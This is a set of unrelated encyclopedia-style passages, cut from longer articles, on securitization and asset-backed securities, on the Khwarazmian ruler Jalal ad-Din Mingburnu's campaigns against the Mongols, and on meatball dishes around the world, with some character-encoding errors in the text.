remain the property of the originator. Under US accounting standards, the originator achieves a sale by being at arm's length from the issuer, in which case the issuer is classified as a \\"qualifying special purpose entity\\" or \\"qSPE\\". Because of these structural issues, the originator typically needs the help of an investment bank (the arranger) in setting up the structure of the transaction. =Issuance= To be able to buy the assets from the originator, the issuer SPV issues tradable securities to fund the purchase. Investors purchase the securities, either through a private offering (targeting institutional investors) or on the open market. The performance of the securities is then directly linked to the performance of the assets. Credit rating agencies rate the securities which are issued to provide an external perspective on the liabilities being created and help the investor make a more informed decision. In transactions with static assets, a depositor will assemble the underlying collateral, help structure the securities and work with the financial markets to sell the securities to investors. The depositor has taken on added significance under Regulation AB. The depositor typically owns 100% of the beneficial interest in the issuing entity and is usually the parent or a wholly owned subsidiary of the parent which initiates the transaction. In transactions with managed (traded) assets, asset managers assemble the underlying collateral, help structure the securities and work with the financial markets in order to sell the securities to investors. Some deals may include a third-party guarantor which provides guarantees or partial guarantees for the assets, the principal and the interest payments, for a fee. The securities can be issued with either a fixed interest rate or a floating rate under currency pegging system. Fixed rate ABS set the \\"coupon\\" (rate) at the time of issuance, in a fashion similar to corporate bonds and T-Bills. Floating rate securities may be backed by both amortizing and non-amortizing assets in the floating market. In contrast to fixed rate securities, the rates on \\"floaters\\" will periodically adjust up or down according to a designated index such as a U.S. Treasury rate, or, more typically, the London Interbank Offered Rate (LIBOR). The floating rate usually reflects the movement in the index plus an additional fixed margin to cover the added risk. =Credit enhancement and tranching= Unlike conventional corporate bonds which are unsecured, securities created in a securitization are \\"credit enhanced\\", meaning their credit quality is increased above that of the originator's unsecured debt or underlying asset pool. This increases the likelihood that the investors will receive the cash flows to which they are entitled, and thus enables the securities to have a higher credit rating than the originator. Some securitizations use external credit enhancement provided by third parties, such as surety bonds and parental guarantees (although this may introduce a conflict of interest). The issued securities are often split into tranches, or categorized into varying degrees of subordination. Each tranche has a different level of credit protection or risk exposure: there is generally a senior (\\"A\\") class of securities and one or more junior subordinated (\\"B\\", \\"C\\", etc.) classes that function as protective layers for the \\"A\\" class. The senior classes have first claim on the cash that the SPV receives, and the more junior classes only start receiving repayment after the more senior classes have been repaid. Because of the cascading effect between classes, this arrangement is often referred to as a cash flow waterfall. If the underlying asset pool becomes insufficient to make payments on the securities (e.g. when loans default within a portfolio of loan claims), the loss is absorbed first by the subordinated tranches, and the upper-level tranches remain unaffected until the losses exceed the entire amount of the subordinated tranches. The senior securities might be AAA or AA rated, signifying a lower risk, while the lower-credit quality subordinated classes receive a lower credit rating, signifying a higher risk. The most junior class (often called the equity class) is the most exposed to payment risk. In some cases, this is a special type of instrument which is retained by the originator as a potential profit flow. In some cases the equity class receives no coupon (either fixed or floating), but only the residual cash flow (if any) after all the other classes have been paid. There may also be a special class which absorbs early repayments in the underlying assets. This is often the case where the underlying assets are mortgages which, in essence, are repaid whenever the properties are sold. Since any early repayments are passed on to this class, it means the other investors have a more predictable cash flow. If the underlying assets are mortgages or loans, there are usually two separate \\"waterfalls\\" because the principal and interest receipts can be easily allocated and matched. But if the assets are income-based transactions such as rental deals one cannot categorise the revenue so easily between income and principal repayment. In this case all the revenue is used to pay the cash flows due on the bonds as those cash flows become due. Credit enhancements affect credit risk by providing more or less protection for promised cash flows for a security. Additional protection can help a security achieve a higher rating, lower protection can help create new securities with differently desired risks, and these differential protections can make the securities more attractive. In addition to subordination, credit may be enhanced through: *A reserve or spread account, in which funds remaining after expenses such as principal and interest payments, charge-offs and other fees have been paid-off are accumulated, and can be used when SPE expenses are greater than its income. *Third-party insurance, or guarantees of principal and interest payments on the securities. *Over-collateralisation, usually by using finance income to pay off principal on some securities before principal on the corresponding share of collateral is collected. *Cash funding or a cash collateral account, generally consisting of short-term, highly rated investments purchased either from the seller's own funds, or from funds borrowed from third parties that can be used to make up shortfalls in promised cash flows. *A third-party letter of credit or corporate guarantee. *A back-up servicer for the loans. *Discounted receivables for the pool. =Servicing= A servicer collects payments and monitors the assets that are the crux of the structured financial deal. The servicer can often be the originator, because the servicer needs very similar expertise to the originator and would want to ensure that loan repayments are paid to the Special Purpose Vehicle. The servicer can significantly affect the cash flows to the investors because it controls the collection policy, which influences the proceeds collected, the charge-offs and the recoveries on the loans. Any income remaining after payments and expenses is usually accumulated to some extent in a reserve or spread account, and any further excess is returned to the seller. Bond rating agencies publish ratings of asset-backed securities based on the performance of the collateral pool, the credit enhancements and the probability of default. When the issuer is structured as a trust, the trustee is a vital part of the deal as the gate-keeper of the assets that are being held in the issuer. Even though the trustee is part of the SPV, which is typically wholly owned by the Originator, the trustee has a fiduciary duty to protect the assets and those who own the assets, typically the investors. =Repayment structures= Unlike corporate bonds, most securitizations are amortized, meaning that the principal amount borrowed is paid back gradually over the specified term of the loan, rather than in one lump sum at the maturity of the loan. Fully amortizing securitizations are generally collateralised by fully amortizing assets, such as home equity loans, auto loans, and student loans. Prepayment uncertainty is an important concern with fully amortizing ABS. The possible rate of prepayment varies widely with the type of underlying asset pool, so many prepayment models have been developed to try to define common prepayment activity. The PSA prepayment model is a well-known example. A controlled amortization structure can give investors a more predictable repayment schedule, even though the underlying assets may be nonamortising. After a predetermined \\"revolving period\\", during which only interest payments are made, these securitizations attempt to return principal to investors in a series of defined periodic payments, usually within a year. An early amortization event is the risk of the debt being retired early. On the other hand, bullet or slug structures return the principal to investors in a single payment. The most common bullet structure is called the soft bullet, meaning that the final bullet payment is not guaranteed to be paid on the scheduled maturity date; however, the majority of these securitizations are paid on time. The second type of bullet structure is the hard bullet, which guarantees that the principal will be paid on the scheduled maturity date. Hard bullet structures are less common for two reasons: investors are comfortable with soft bullet structures, and they are reluctant to accept the lower yields of hard bullet securities in exchange for a guarantee. Securitizations are often structured as a sequential pay bond, paid off in a sequential manner based on maturity. This means that the first tranche, which may have a one-year average life, will receive all principal payments until it is retired; then the second tranche begins to receive principal, and so forth. Pro rata bond structures pay each tranche a proportionate share of principal throughout the life of the security. = Structural risks and misincentives = Some originators (e.g. of mortgages) have prioritised loan volume over credit quality, disregarding the long-term risk of the assets they have created in their enthusiasm to profit from the fees associated with origination and securitization. Other originators, aware of the reputational harm and added expense if risky loans are subject to repurchase requests or improperly originated loans lead to litigation, have paid more attention to credit quality. Special types of securitization =Master trust= A master trust is a type of SPV particularly suited to handle revolving credit card balances, and has the flexibility to handle different securities at different times. In a typical master trust transaction, an originator of credit card receivables transfers a pool of those receivables to the trust and then the trust issues securities backed by these receivables. Often there will be many tranched securities issued by the trust all based on one set of receivables. After this transaction, typically the originator would continue to service the receivables, in this case the credit cards. There are various risks involved with master trusts specifically. One risk is that timing of cash flows promised to investors might be different from timing of payments on the receivables. For example, credit card-backed securities can have maturities of up to 10 years, but credit card-backed receivables usually pay off much more quickly. To solve this issue these securities typically have a revolving period, an accumulation period, and an amortization period. All three of these periods are based on historical experience of the receivables. During the revolving period, principal payments received on the credit card balances are used to purchase additional receivables. During the accumulation period, these payments are accumulated in a separate account. During the amortization period, new payments are passed through to the investors. A second risk is that the total investor interests and the seller's interest are limited to receivables generated by the credit cards, but the seller (originator) owns the accounts. This can cause issues with how the seller controls the terms and conditions of the accounts. Typically to solve this, there is language written into the securitization to protect the investors and potential receivables. A third risk is that payments on the receivables can shrink the pool balance and under-collateralize total investor interest. To prevent this, often there is a required minimum seller's interest, and if there was a decrease then an early amortization event would occur. =Issuance trust= In 2000, Citibank introduced a new structure for credit card-backed securities, called an issuance trust, which does not have limitations that master trusts sometimes do, that requires each issued series of securities to have both a senior and subordinate tranche. There are other benefits to an issuance trust: they provide more flexibility in issuing senior/subordinate securities, can increase demand because pension funds are eligible to invest in investment- grade securities issued by them, and they can significantly reduce the cost of issuing securities. Because of these issues, issuance trusts are now the dominant structure used by major issuers of credit card-backed securities. =Grantor trust= Grantor trusts are typically used in automobile-backed securities and REMICs (Real Estate Mortgage Investment Conduits). Grantor trusts are very similar to pass-through trusts used in the earlier days of securitization. An originator pools together loans and sells them to a grantor trust, which issues classes of securities backed by these loans. Principal and interest received on the loans, after expenses are taken into account, are passed through to the holders of the securities on a pro-rata basis. =Owner trust= In an owner trust, there is more flexibility in allocating principal and interest received to different classes of issued securities. In an owner trust, both interest and principal due to subordinate securities can be used to pay senior securities. Due to this, owner trusts can tailor maturity, risk and return profiles of issued securities to investor needs. Usually, any income remaining after expenses is kept in a reserve account up to a specified level and then after that, all income is returned to the seller. Owner trusts allow credit risk to be mitigated by over-collateralization by using excess reserves and excess finance income to prepay securities before principal, which leaves more collateral for the other classes. Motives for securitization =Advantages to issuer= Reduces funding costs: Through securitization, a company rated BB but with AAA worthy cash flow would be able to borrow at possibly AAA rates. This is the number one reason to securitize a cash flow and can have tremendous impacts on borrowing costs. The difference between BB debt and AAA debt can be multiple hundreds of basis points. For example, Moody's downgraded Ford Motor Credit's rating in January 2002, but senior automobile backed securities, issued by Ford Motor Credit in January 2002 and April 2002, continue to be rated AAA because of the strength of the underlying collateral and other credit enhancements. Reduces asset-liability mismatch: \\"Depending on the structure chosen, securitization can offer perfect matched funding by eliminating funding exposure in terms of both duration and pricing basis.\\"\\"The Handbook of Asset-Backed Securities\\", Jess Lederman, 1990. Essentially, in most banks and finance companies, the liability book or the funding is from borrowings. This often comes at a high cost. Securitization allows such banks and finance companies to create a self-funded asset book. Lower capital requirements: Some firms, due to legal, regulatory, or other reasons, have a limit or range that their leverage is allowed to be. By securitizing some of their assets, which qualifies as a sale for accounting purposes, these firms will be able to remove assets from their balance sheets while maintaining the \\"earning power\\" of the assets. Locking in profits: For a given block of business, the total profits have not yet emerged and thus remain uncertain. Once the block has been securitized, the level of profits has now been locked in for that company, thus the risk of profit not emerging, or the benefit of super-profits, has now been passed on. Transfer risks (credit, liquidity, prepayment, reinvestment, asset concentration): Securitization makes it possible to transfer risks from an entity that does not want to bear it, to one that does. Two good examples of this are catastrophe bonds and Entertainment Securitizations. Similarly, by securitizing a block of business (thereby locking in a degree of profits), the company has effectively freed up its balance to go out and write more profitable business. Off balance sheet: Derivatives of many types have in the past been referred to as \\"off-balance-sheet\\". This term implies that the use of derivatives has no balance sheet impact. While there are differences among the various accounting standards internationally, there is a general trend towards the requirement to record derivatives at fair value on the balance sheet. There is also a generally accepted principle that, where derivatives are being used as a hedge against underlying assets or liabilities, accounting adjustments are required to ensure that the gain/loss on the hedged instrument is recognized in the income statement on a similar basis as the underlying assets and liabilities. Certain credit derivatives products, particularly Credit Default Swaps, now have more or less universally accepted market standard documentation. In the case of Credit Default Swaps, this documentation has been formulated by the International Swaps and Derivatives Association (ISDA) who have for a long time provided documentation on how to treat such derivatives on balance sheets. Earnings: Securitization makes it possible to record an earnings bounce without any real addition to the firm. When a securitization takes place, there often is a \\"true sale\\" that takes place between the Originator (the parent company) and the SPE. This sale has to be for the market value of the underlying assets for the \\"true sale\\" to stick and thus this sale is reflected on the parent company's balance sheet, which will boost earnings for that quarter by the amount of the sale. While not illegal in any respect, this does distort the true earnings of the parent company. Admissibility: Future cashflows may not get full credit in a company's accounts (life insurance companies, for example, may not always get full credit for future surpluses in their regulatory balance sheet), and a securitization effectively turns an admissible future surplus flow into an admissible immediate cash asset. Liquidity: Future cashflows may simply be balance sheet items which currently are not available for spending, whereas once the book has been securitized, the cash would be available for immediate spending or investment. This also creates a reinvestment book which may well be at better rates. =Disadvantages to issuer= May reduce portfolio quality: If the AAA risks, for example, are being securitized out, this would leave a materially worse quality of residual risk. Costs: Securitizations are expensive due to management and system costs, legal fees, underwriting fees, rating fees and ongoing administration. An allowance for unforeseen costs is usually essential in securitizations, especially if it is an atypical securitization. Size limitations: Securitizations often require large scale structuring, and thus may not be cost-efficient for small and medium transactions. Risks: Since securitization is a structured transaction, it may include par structures as well as credit enhancements that are subject to risks of impairment, such as prepayment, as well as credit loss, especially for structures where there are some retained strips. =Advantages to investors= Opportunity to potentially earn a higher rate of return (on a risk-adjusted basis) Opportunity to invest in a specific pool of high quality assets: Due to the stringent requirements for corporations (for example) to attain high ratings, there is a dearth of highly rated entities that exist. Securitizations, however, allow for the creation of large quantities of AAA, AA or A rated bonds, and risk averse institutional investors, or investors that are required to invest in only highly rated assets, have access to a larger pool of investment options. Portfolio diversification: Depending on the securitization, hedge funds as well as other institutional investors tend to like investing in bonds created through securitizations because they may be uncorrelated to their other bonds and securities. Isolation of credit risk from the parent entity: Since the assets that are securitized are isolated (at least in theory) from the assets of the originating entity, under securitization it may be possible for the securitization to receive a higher credit rating than the \\"parent\\", because the underlying risks are different. For example, a small bank may be considered more risky than the mortgage loans it makes to its customers; were the mortgage loans to remain with the bank, the borrowers may effectively be paying higher interest (or, just as likely, the bank would be paying higher interest to its creditors, and hence less profitable). =Risks to investors= Liquidity risk Credit/default: Default risk is generally accepted as a borrower‚Äôs inability to meet interest payment obligations on time. For ABS, default may occur when maintenance obligations on the underlying collateral are not sufficiently met as detailed in its prospectus. A key indicator of a particular security‚Äôs default risk is its credit rating. Different tranches within the ABS are rated differently, with senior classes of most issues receiving the highest rating, and subordinated classes receiving correspondingly lower credit ratings. Almost all mortgages, including reverse mortgages, and student loans, are now insured by the government, meaning that taxpayers are on the hook for any of these loans that go bad even if the asset is massively over-inflated. In other words, there are no limits or curbs on over-spending, or the liabilities to taxpayers. However, the credit crisis of 2007‚Äì2008 has exposed a potential flaw in the securitization process ‚Äì loan originators retain no residual risk for the loans they make, but collect substantial fees on loan issuance and securitization, which doesn't encourage improvement of underwriting standards. Event risk Prepayment/reinvestment/early amortization: The majority of revolving ABS are subject to some degree of early amortization risk. The risk stems from specific early amortization events or payout events that cause the security to be paid off prematurely. Typically, payout events include insufficient payments from the underlying borrowers, insufficient excess spread, a rise in the default rate on the underlying loans above a specified level, a decrease in credit enhancements below a specific level, and bankruptcy on the part of the sponsor or servicer. Currency interest rate fluctuations: Like all fixed income securities, the prices of fixed rate ABS move in response to changes in interest rates. Fluctuations in interest rates affect floating rate ABS prices less than fixed rate securities, as the index against which the ABS rate adjusts will reflect interest rate changes in the economy. Furthermore, interest rate changes may affect the prepayment rates on underlying loans that back some types of ABS, which can affect yields. Home equity loans tend to be the most sensitive to changes in interest rates, while auto loans, student loans, and credit cards are generally less sensitive to interest rates. Contractual agreements Moral hazard: Investors usually rely on the deal manager to price the securitizations‚Äô underlying assets. If the manager earns fees based on performance, there may be a temptation to mark up the prices of the portfolio assets. Conflicts of interest can also arise with senior note holders when the manager has a claim on the deal's excess spread. Servicer risk: The transfer or collection of payments may be delayed or reduced if the servicer becomes insolvent. This risk is mitigated by having a backup servicer involved in the transaction. History =Early developments= Modern practice of securitization has its roots in the 17th- century Dutch Republic. Examples of securitization can be found at least as far back as the 18th century. Among the early examples of mortgage-backed securities in the United States were the farm railroad mortgage bonds of the mid-19th century which contributed to the panic of 1857. In February 1970, the U.S. Department of Housing and Urban Development created the first modern residential mortgage-backed security. The Government National Mortgage Association (GNMA or Ginnie Mae) sold securities backed by a portfolio of mortgage loans. To facilitate the securitization of non-mortgage assets, businesses substituted private credit enhancements. First, they over- collateralised pools of assets; shortly thereafter, they improved third-party and structural enhancements. In 1985, securitization techniques that had been developed in the mortgage market were applied for the first time to a class of non-mortgage assets ‚Äî automobile loans. A pool of assets second only to mortgages in volume, auto loans were a good match for structured finance; their maturities, considerably shorter than those of mortgages, made the timing of cash flows more predictable, and their long statistical histories of performance gave investors confidence. This early auto loan deal was a $60 million securitization originated by Marine Midland Bank and securitised in 1985 by the Certificate for Automobile Receivables Trust (CARS, 1985-1). The first significant bank credit card sale came to market in 1986 with a private placement of $50 million of outstanding bank card loans. This transaction demonstrated to investors that, if the yields were high enough, loan pools could support asset sales with higher expected losses and administrative costs than was true within the mortgage market. Sales of this type ‚Äî with no contractual obligation by the seller to provide recourse ‚Äî allowed banks to receive sales treatment for accounting and regulatory purposes (easing balance sheet and capital constraints), while at the same time allowing them to retain origination and servicing fees. After the success of this initial transaction, investors grew to accept credit card receivables as collateral, and banks developed structures to normalize the cash flows. Starting in the 1990s with some earlier private transactions, securitization technology was applied to a number of sectors of the reinsurance and insurance markets including life and catastrophe. This activity grew to nearly $15bn of issuance in 2006 following the disruptions in the underlying markets caused by Hurricane Katrina and Regulation XXX. Key areas of activity in the broad area of Alternative Risk Transfer include catastrophe bonds, Life Insurance Securitization and Reinsurance Sidecars. The first public Securitization of Community Reinvestment Act (CRA) loans started in 1997. CRA loans are loans targeted to low and moderate income borrowers and neighborhoods. As estimated by the Bond Market Association, in the United States, the total amount outstanding at the end of 2004 was $1.8 trillion. This amount was about 8 percent of total outstanding bond market debt ($23.6 trillion), about 33 percent of mortgage- related debt ($5.5 trillion), and about 39 percent of corporate debt ($4.7 trillion) in the United States. In nominal terms, over the previous ten years (1995‚Äì2004) ABS amount outstanding had grown about 19 percent annually, with mortgage-related debt and corporate debt each growing at about 9 percent. Gross public issuance of asset-backed securities was strong, setting new records in many years. In 2004, issuance was at an all-time record of about $0.9 trillion. At the end of 2004, the larger sectors of this market were credit card-backed securities (21 percent), home-equity backed securities (25 percent), automobile-backed securities (13 percent), and collateralized debt obligations (15 percent). Among the other market segments were student loan- backed securities (6 percent), equipment leases (4 percent), manufactured housing (2 percent), small business loans (such as loans to convenience stores and gas stations), and aircraft leases. Modern securitization took off in the late 1990s or early 2000s, thanks to the innovative structures implemented across the asset classes, such as UK Mortgage Master Trusts (concept imported from the US Credit Cards), Insurance-backed transaction (such as those implemented by the insurance securitization guru Emmanuel Issanchou) or even more esoteric asset classes (for example securitization of lottery receivables). As the result of the credit crunch precipitated by the subprime mortgage crisis the US market for bonds backed by securitised loans was very weak in 2008 except for bonds guaranteed by a federally backed agency. As a result, interest rates rose for loans that were previously securitised such as home mortgages, student loans, auto loans and commercial mortgages. =Recent lawsuits= Recently there have been several lawsuits attributable to the rating of securitizations by the three leading rating agencies. In July, 2009, the USA‚Äôs largest public pension fund has filed suit in California state court in connection with $1 billion in losses that it says were caused by \\"wildly inaccurate\\" credit ratings from the three leading ratings agencies.

When it became known that Genghis Khan was marching towards Khwarazm, Jalal ad-din proposed to his father to meet the Mongols in one decisive battle near the Syr Darya. However, Muhammad II relied on his well-fortified fortresses and did not assemble troops, distributing them instead among the major towns of his empire. Meanwhile, the Mongols swiftly took one city after another. At the beginning of 1220, Bukhara fell, followed by Samarqand. Muhammad started to retreat west, and after a series of unsuccessful battles, was left with a handful of soldiers and his sons. The huge and undisciplined Khwarazmian army was unable to defeat the enemy, which was much inferior in number. Legend has it that Muhammad, who fled to the Caspian Sea, being terminally ill, gathered his sons: Jalal ad-Din, Aqshah, and Uzlagh Khan and announced that he appointed Jalal ad-Din as heir to the throne, because only he could confront the enemy. Summoning the younger sons to obedience, he hung his sword on the belt of Jalal ad-Din. A few days later, Muhammad died and Jalal ad-Din was proclaimed a Khwarazmshah.Gudogdyev, Ovez. \\"Historical and Cultural Heritage of Turkmenistan: Encyclopedic Dictionary\\". Istanbul. 2000. pages 381; Following the defeat of his father, Ala ad-Din Muhammad II by Genghis Khan in 1220, Jalal ad-Din Mingburnu came to power and retreated with the remaining Khwarazm forces, while pursued by a Mongol army and at the battle of Parwan, north of Kabul, defeated the Mongols. Due to the Mongol invasion, the sacking of Samarkand and being deserted by his Afghan allies, Jalal ad-Din was forced to flee to India. At the Indus River, however, the Mongols caught up with him and slaughtered his forces, along with thousands of refugees, at the Battle of Indus. He escaped and sought asylum in the Sultanate of Delhi but Iltutmish denied this to him in deference to the relationship with the Abbasid caliphs. The cities of Herat, Ghazni and Merv were destroyed and massacred by the Mongols, for his resistance or rebelliousness. Re-establishment of the kingdom Jalal ad-Din Mingburnu spent three years in exile in India. He entered into an alliance with the Khokhars, Lahore, and much of the Punjab was captured. At this stage he requested an alliance with Iltutmish, the Turkish Mamluk Sultan of Delhi against the Mongols. The Sultan of Delhi refused so he could avoid a conflict with Genghis Khan and marched towards Lahore at the head of a large army. Mingburnu retreated from Lahore and moved towards Uchch, inflicting a heavy defeat on its ruler Nasir-ud-Din Qabacha, and plundered Sindh, then northern Gujarat before returning to Persia in 1224. Having gathered an army and entered Persia, Jalal ad-Din sought to re-establish the Khwarazm kingdom, but he never fully consolidated his power. In 1224, he confirmed Burak Hadjib, ruler of the Qara Khitai, in Kerman, received the submission of his brother Ghiyath al-Din Pirshah, who had established himself in Hamadan and Isfahan, and the province of Fars, and clashed with the Caliph An Nasser in Khuzestan. In 1225, the sultan dethroned the Ildegizid Uzbek Muzaffar al-Din and set himself up in their capital of Tabriz on the 25 of July in 1225. In 1226, he attacked Georgia defeating their forces in the battle of Garni and conquered Tbilisi. Warfare Jalal ad-Din spent the rest of his days struggling against the Mongols, pretenders to the throne and the Seljuqs of R√ªm. His dominance in the region required year-after-year campaigning. In 1226, the governor of Kerman, Burak Hadjib, rebelled against him, but after the sultan marched against him he was again brought back into agreement. Jalal ad-Din then had a brief victory over the Seljuqs and captured the town of Akhlat in Turkey from the Ayyubids. In 1227, he battled against the Mongols on the approach to Isfahan and while he did not defeat the invaders following their great losses they were not able to utilise their victory and withdrew afterwards across the Oxus river. In 1228, his brother Ghiyath al-Din rebelled and was defeated by the Sultan. Ghiyath al-Din fled to Burak Hadjib in Kerman where he and his mother were murdered. The revived Khwarezmid Sultan by this time controlled Kerman, Tabriz, Isfahan and Fars. Jalal ad-Din moved against Akhlat again in 1229. However he was defeated in this campaign by Sultan Kayqubad I at Erzincan on the Upper Euphrates at the Battle of Yassƒ±√ßemen in 1230, from whence he escaped to Diyarbakir.  Death  Through the ruler of Alamut, the Mongols learned that Jalal ad-Din was weakened by a recent defeat. √ñgedei Khan sent a new army of 30,000 men under the command of Chormagan and the Khwarazmians were swept away by the new Mongol army.

The term is sometimes extended to meatless versions based on vegetables or fish; the latter are commonly known as fishballs.  History  The Chinese recipe \\"Four Joy Meatballs\\" (ÂõõÂñú‰∏∏Â≠ê‚ÄîS√¨ x«ê w√°nzi) is derived from Shandong cuisine, which originated in the native cooking styles of Shandong. Its history dates back to the Qin dynasty (221 BC to 207 BC). The ancient Roman cookbook Apicius included many meatball-type recipes.Sally Grainger, Cooking Apicius: Roman Recipes for Today, Prospect Books, 2006, , p. 17-18 Early recipes included in some of the earliest known Persian cookbooks generally feature seasoned lamb rolled into orange-sized balls and glazed with egg yolk and sometimes saffron.

They are typically made with ground beef or a mixture of pork and beef and served with mashed potatoes or rice, often with tomato based sauce. *Danish meatballs are known as frikadeller and are typically fried. They are usually made out of ground pork, veal, onions, eggs, salt, and pepper; these are formed into balls and flattened somewhat, so they are pan ready. However, the Danish cuisine also includes other versions, such as boller i karry (meatballs in curry sauce, typically served with rice), and the smaller meatballs used in soup with melboller (Danish dumplings). *In Estonia, meatballs are called lihapallid (literally \\"meatballs\\") and are similar to those of Finnish or Swedish cuisine. *In Finland, meatballs are called lihapullat (literally \\"meatbuns\\"). They are made with ground beef or a mix of ground beef and pork, or even with ground reindeer meat, mixed with breadcrumbs soaked in milk or viili, beef stock and finely chopped onions or alternatively, French onion soup readymix. They are seasoned with white pepper and salt. Meatballs are traditionally served with gravy, boiled potatoes (or mashed potatoes), lingonberry jam, and sometimes pickled cucumber. *In France, meatballs are known as boulettes de viandes or (in Northern France) fricadelles.

Also, the m√°jgomb√≥c (liver dumpling) is popular in soups. *In Italy, meatballs (called polpette , sing. polpetta) are generally eaten as a main course or in a soup. The main ingredients of an Italian meatball are beef and/or pork and sometimes poultry or sausage, salt, black pepper, chopped garlic, olive oil, Romano cheese, eggs, bread crumbs, and parsley, mixed and rolled by hand to a golf ball size. In the Abruzzo region of Italy, especially in the Province of Teramo, the meatballs are typically the size of marbles and are called polpettine . *In the Netherlands, meatballs are called gehaktbal, and are often served with boiled potatoes and vegetables. They are usually made out of mixed beef and pork minced meat, eggs, onion and bread crumbs. *In Norway, meatballs are called kj√∏ttkaker (lit. \\"meatcakes\\").

Kj√∏ttboller are round, like the typical meatball, whereas kj√∏ttkaker or meat cakes are in a patty form, flattened out and a bit oval in shape. *In Poland, they are called pulpety (singular pulpet, from the Italian name) or klopsy (singular klops, from German Klopse), and pulpeciki (\\"little pulpety\\"), and are usually served cooked with a variety of sauces (such as tomato or a kind of gravy thickened with flour, as well as forest mushroom sauce) with potatoes, rice or all sorts of kasza. Pulpety or klopsy are usually made from seasoned ground meat with onion and mixed with eggs and either breadcrumbs or wheat rolls soaked in milk or water. Fried pulpety are larger than typical cooked ones. They can be round or flat in shape. The latter, in many countries, would be considered a cross between a meatball and a hamburger. The fried variety is called mielony (short for kotlet mielony, literally \\"minced cutlet\\"), and its mass-produced version (as well as the one served in bars, etc.) is the subject of many jokes and urban legends about what is used to produce it. *In Portugal, meatballs are called alm√¥ndegas .

Some common additions are various vegetables, ketchup, various spices, etc. are made with ground beef or a mix of ground beef, pork and sometimes veal or venison, sometimes including breadcrumbs soaked in milk, finely chopped (fried) onions, some broth and often including cream. They are seasoned with white pepper or allspice and salt.Widenfelt, Sam Swedish Food, Gothenburg, Sweden Esselte 1956. Swedish meatballs are traditionally served with gravy, boiled potatoes, lingonberry jam, and sometimes pickled cucumber. Traditionally, they are small, around in diameter although larger meatballs are often served at restaurants.Herbst, Sharon Tyler Food Lover's Companion Hauppauge, New York: Barron's Educational Series, Inc. 1990. In 2018 a Swedish Twitter account claimed that what we know as Swedish meatballs are based on a Turkish recipe and King Charles XII used food as a way to help boost the relationships between the two countries. However a Stockholm University professor of food and meal science later stated that this was unlikely and that meatballs likely originated in France or Italy instead. *In Turkey, meatballs are called k√∂fte and are extremely popular; there are many different versions with a variety of shapes ‚Äì not necessarily round. Meatballs in Turkey are usually made with ground lamb or a mix of ground beef and lamb. Variants are mostly named after their traditional cities; such as ƒ∞neg√∂l k√∂fte, ƒ∞zmir k√∂fte, Ak√ßaabat k√∂fte and Tire k√∂fte. Some of the other popular ones are ≈üi≈ü k√∂fte, kadƒ±nbudu k√∂fte and sulu k√∂fte. There is also a variant called √áiƒü k√∂fte that can be vegan. *In Ukraine, they are called kotleta () when fried and frykadelka () when boiled in soup. = Americas = A meatball pizza Mexican Most meatball recipes found in the Americas are derived from European cuisine influences, notably Italian, Iberian (Portuguese-Spanish), and Nordic (Swedish) cuisines. *In Brazil, meatballs are called alm√¥ndegas, derived from Italian influences. These are usually served with tomato sauce and pasta. *In the Canadian province of Quebec, meatballs are the main component of a traditional dish called rago√ªt de boulettes (meatball stew). The meatballs are made with ground pork, onions, spices like cinnamon, cloves and nutmeg and are simmered in a gravy that's thickened with toasted flour. The dish is normally served with boiled or mashed potatoes and pickled beets. It is so popular that a factory-processed version of the dish is available canned in most supermarkets throughout the province. *In Mexico, alb√≥ndigas are commonly served with a light broth and vegetables, or with a mild chipotle sauce. *In the United States, meatballs are commonly derived from European cuisine influence. Usually, they are served with spaghetti, on pizza, or on a sub (i.e., spaghetti and meatballs, meatball pizza, and meatball sandwiches). In the Southern United States, venison or beef is also often mixed with spices and baked into large meatballs that can be served as an entr√©e. Another variation, called \\"porcupine meatballs\\" are basic meatballs often with rice in them. Several varieties of meatball pizza exist, such as Tex Mex and Greek- style lamb sweet and sour. The meatballs on meatball pizzas may be sliced to reduce their size, sliced in half, or broken-up and spread out on them. = Middle East and South Asia = Kofta (Kufteh Tabrizi) Kofta is a type of meatball or dumpling that is widely distributed in Middle Eastern, South Asian, Mediterranean and Balkan (Central and Eastern Europe) cuisines. The word kofta is derived from Persian k≈´fta: In Persian, ⁄©ŸàŸÅÿ™ŸÜ (kuftan) means \\"to beat\\" or \\"to grind\\" or meatball.Alan S. Kaye, \\"Persian loanwords in English\\", English Today 20:20-24 (2004), . In the simplest form, koftas consist of balls or fingers of minced or ground meat ‚Äì usually beef or lamb ‚Äì mixed with spices and/or onions and other ingredients. The vegetarian variety is popular in India. They can be grilled, fried, steamed, poached, baked or marinated, and may be served with a rich spicy sauce. *In Afghanistan, meatballs are used as a traditional dish with homemade soups or are made with a tomato-based sauce that may include some plum seeds to increase tartness and is served with bread or rice which is called Kofta-Chelou. Nowadays meatballs are also grilled on top of pizza. *Armenian stewed meatballs/meatball and vegetable stew (kufte rize) is a classic dish often poured over rice for consumption. *In Iran, several types of meatballs are consumed. If they are cooked in a stew, they are called kufteh. If they are fried (typically small meatballs), they are called kal-e gonjeshki (literally \\"sparrow's head\\"). Both types are consumed with either bread or rice. Typically, herbs are added, and for kufteh, usually the meatball is filled with hard boiled eggs or dried fruits. There are several (at least 10) types; the most famous is \\"kufteh tabrizi\\", traditionally from Tabriz in northwestern Iran. *In Israel, meatballs are called ktzitzot basar (), or sometimes simply ktzitzot (). Their exact ingredients and preparation vary widely, due to the influence of Jewish immigration from different regions. They are typically made of spiced ground beef, though turkey and chicken versions are also available, and in their common form, they are shaped as slightly flattened balls, pan fried and then cooked in tomato sauce or broth. Other variations also exist, including the gondi, which were brought by the Persian Jews, the albondigas of the Sephardic cuisine, and the kufta that is customary with some Mizrahi Jews. *In Pakistan and India, meatballs are called koftas. Pakistani and Indian meatballs are normally cooked in a spicy curry and sometimes with whole pre-boiled eggs. In Pakistan they are cooked in a gravy called chorba. Sometimes the eggs are encased in a layer of the spicy kofta meat so that the final product resembles an Indian Scotch egg. These kofta dishes are very popular with Indian diaspora and are widely available from many Indian restaurants. *In Syria, meatballs are prepared in numerous ways. They are grilled on charcoal with or without eggplants or cooked in a stew with potato, onion and tomato sauce with a side of rice which is called Dawood Pasha. *In West Bengal state of India and Bangladesh, koftas are made with prawns, fish, green bananas, and cabbage, as well as minced goat meat. = East and Southeast Asia = A variety of Chinese meatballs and fishballs *Chinese meatballs (wanzi) are typically made of pork and can be steamed, boiled or deep fried, sometimes with the addition of soy sauce. Large meatballs, called lion's heads, can range in size from about in diameter. Smaller varieties, called pork balls, are used in soups. A Cantonese variant, the steamed meatball, is made of beef and served as a dim sum dish. Fish and seafood can also used to create different flavors and textures, and vegetarian alternatives to meatballs are served during festivals. In northern China, 